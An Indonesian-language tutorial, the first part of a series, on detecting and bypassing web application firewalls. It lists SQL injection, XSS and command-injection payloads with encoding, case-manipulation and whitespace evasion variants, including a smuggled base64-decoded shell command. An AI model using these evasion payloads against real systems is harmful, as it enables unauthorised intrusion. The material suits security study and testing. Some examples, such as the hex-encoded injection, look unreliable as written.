# Kamus Besar Bypass WAF - Part 1

## 📌 Pendahuluan
Web Application Firewall (WAF) adalah sistem keamanan yang dirancang untuk melindungi aplikasi web dari serangan umum seperti SQL Injection, Cross-Site Scripting (XSS), Remote Code Execution (RCE), dan lainnya. Namun, banyak teknik telah dikembangkan untuk **membypass** atau melewati perlindungan WAF, memungkinkan penyerang untuk tetap menembus sistem.

**Dokumen ini merupakan ensiklopedia mendalam tentang bypass WAF**, mulai dari dasar-dasar cara kerja WAF hingga teknik eksploitasi lanjutan.

---

## 📜 Sejarah WAF
WAF pertama kali dikembangkan untuk melindungi aplikasi web dari eksploitasi yang semakin kompleks. Beberapa milestone penting dalam perkembangan WAF:

- **1999** - Konsep WAF pertama kali diperkenalkan oleh Perfecto Technologies.
- **2003** - ModSecurity dirilis sebagai solusi WAF open-source pertama.
- **2010** - Cloudflare mulai menawarkan layanan WAF berbasis cloud.
- **2015-sekarang** - WAF modern berbasis AI dan ML mulai digunakan untuk deteksi anomali.

---

## 🏗️ Struktur & Arsitektur WAF
Secara umum, WAF bekerja dengan beberapa metode utama:

1. **Signature-Based Detection**  
   - Mencocokkan pola serangan yang sudah diketahui.  
   - Kelemahan: Mudah dibypass dengan encoding dan obfuscation.  

2. **Anomaly-Based Detection**  
   - Menganalisis lalu lintas dan mencari perilaku yang mencurigakan.  
   - Kelemahan: Rentan terhadap false positives & evasive payloads.  

3. **Machine Learning-Based WAF**  
   - Menggunakan AI untuk mendeteksi pola serangan yang tidak diketahui sebelumnya.  
   - Kelemahan: Bisa dieksploitasi dengan adversarial attacks.  

---

## 🕵️‍♂️ Metode Deteksi WAF
Sebelum membypass WAF, kita harus mendeteksi apakah target menggunakan WAF. Beberapa teknik yang umum digunakan:

### 🔹 1. Passive Detection  
- **Cek Header HTTP** - Banyak WAF meninggalkan jejak di header HTTP seperti:
  ```bash
  curl -I https://target.com
  ```
  Jika ada header seperti `Server: cloudflare`, kemungkinan target memakai Cloudflare WAF.

- **Cek Response Code** - Jika permintaan normal mendapatkan HTTP 200 tetapi payload berbahaya mendapatkan HTTP 403, maka ada kemungkinan WAF aktif.

### 🔹 2. Active Detection  
- **Menggunakan WAFW00F** - Tool otomatis untuk mendeteksi WAF:
  ```bash
  wafw00f https://target.com
  ```

- **Brute Force Bypass** - Mencoba berbagai payload umum untuk melihat apakah ada yang lolos.

---

## 🎭 Teknik Dasar Bypass WAF

### 🔸 1. Bypass dengan Encoding
Menggunakan encoding seperti URL encoding, Base64, atau Hex untuk menyamarkan payload.

- **Contoh SQL Injection tanpa encoding:**
  ```sql
  ' OR 1=1 --
  ```

- **Contoh dengan URL encoding:**
  ```sql
  %27%20OR%201%3D1%20--
  ```

- **Contoh dengan Hex encoding:**
  ```sql
  0x27204F5220313D31202D2D
  ```

### 🔸 2. Bypass dengan Case Manipulation
WAF yang lemah mungkin hanya mendeteksi kata kunci dalam huruf kecil.

- **Payload Standar:**
  ```sql
  SELECT * FROM users WHERE username='admin' --
  ```

- **Bypass dengan kapitalisasi acak:**
  ```sql
  SeLeCt * FrOm users WhErE username='admin' --
  ```

### 🔸 3. Bypass dengan White Spaces Alternatif
Menggunakan karakter tak terlihat seperti tab (`	`), newline (`
`), atau komentar SQL.

- **Contoh menggunakan komentar SQL:**
  ```sql
  SELECT/*bypass*/username,password FROM users WHERE username='admin'
  ```

- **Contoh menggunakan tab:**
  ```sql
  SELECT	username,password	FROM users WHERE username='admin'
  ```

---

## 🎯 Contoh Payload Awal untuk Bypass WAF

| **Serangan** | **Payload Dasar** | **Payload yang Dimodifikasi** |
|-------------|-----------------|-----------------------------|
| SQLi | `' OR 1=1 --` | `%27%20OR%201%3D1%20--` |
| XSS | `<script>alert(1)</script>` | `<img src=x onerror=alert(1)>` |
| RCE | `; ls -la` | `|$(echo bHMgLWxhCg== | base64 -d)` |

---

## 📌 Kesimpulan Sementara
Bagian pertama ini mencakup **dasar-dasar bypass WAF**, termasuk sejarah, metode deteksi, dan beberapa teknik bypass awal seperti encoding dan case manipulation.  
Bagian selanjutnya akan membahas **bypass WAF tingkat lanjut**, termasuk AI-based bypass, obfuscation yang lebih kompleks, dan payload eksklusif.

🛠️ **Next:** "Payload Bypass SQLi, XSS, RCE, SSRF, SSTI, dan Teknik AI-Based WAF Evasion"  

